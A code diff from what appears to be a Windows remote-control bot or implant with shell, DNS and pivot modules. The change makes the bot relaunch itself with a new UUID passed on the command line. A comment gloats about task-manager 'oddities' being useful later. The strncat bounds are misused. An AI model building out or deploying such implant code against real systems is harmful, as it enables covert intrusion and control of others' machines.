@@ -17,6 +17,7 @@
 #include "shell.h"
 #include "dns.h"
 #include "pivot.h"
+#include "uuid4.h"
 
 // Main command loop.
 int command_loop(Parser *p)
@@ -132,29 +133,41 @@ void do_system_fork(Parser *p)
     // The processes are forking alright but they can't seem to use sockets afterwards.
     // There are also some oddities in task manager... this could be useful later! >:)
     //
-    // Instead, let's just launch a new process, since for this call it's all the same,
-    // The downside is we cannot pass the new UUID back to the caller. :(
-    // On the console it will show up just like any other new connection.
+    // Instead, let's just launch a new process, since for this call it's all the same.
+    // We will pass the desired UUID value over the command line.
 
-    char arguments[1024];
+    // Memory buffers for constructing the new command line string.
+    char arguments[4096];
     char name[MAX_PATH];
-    char port[32];
+    char uuid_str[39];
     memset(arguments, 0, sizeof(arguments));
     memset(name, 0, sizeof(name));
-    memset(port, 0, sizeof(port));
+    memset(uuid_str, 0, sizeof(uuid_str));
+
+    // Generate a new UUID for the new instance.
+    unsigned char uuid[16];
+    uuid4(uuid);
+    uuid_encode(uuid, uuid_str, sizeof(uuid_str));
+
+    // Get the current executable pathname.
     GetModuleFileNameA(NULL, name, MAX_PATH);
-    itoa(p->port, port, 10);
-    strcpy(arguments, name);
-    strncat(arguments, " ", sizeof(arguments)-1);
-    strncat(arguments, p->hostname, sizeof(arguments)-1);
-    strncat(arguments, " ", sizeof(arguments)-1);
-    strncat(arguments, port, sizeof(arguments)-1);
-    strncat(arguments, " ", sizeof(arguments)-1);
-    LOG("Launching new instance of bot. Command line: %s\n", arguments);
-    if (arguments[strlen(arguments)-1] != ' ') {
-        parser_error(p, "internal error");
-        return;
+
+    // Get the current command line arguments.
+    strncpy(arguments, GetCommandLineA(), sizeof(arguments)-1);
+
+    // Crude detection for previous -u arguments.
+    // This should prevent the -u switches from piling up.
+    size_t len = strlen(arguments);
+    if (len >= 41 && arguments[len-41] == ' ' && arguments[len-40] == '-' && arguments[len-39] == 'u' && arguments[len-38] == ' ') {
+        arguments[len-41] = 0;
     }
+
+    // Add a new -u switch at the end with the new UUID.
+    strncat(arguments, " -u ", sizeof(arguments)-1);
+    strncat(arguments, uuid_str, sizeof(arguments)-1);
+
+    // Launch the new process.
+    LOG("Launching new instance of bot. Command line: %s\n", arguments);
     PROCESS_INFORMATION pi;
     STARTUPINFO si;
     memset(&pi, 0, sizeof(pi));
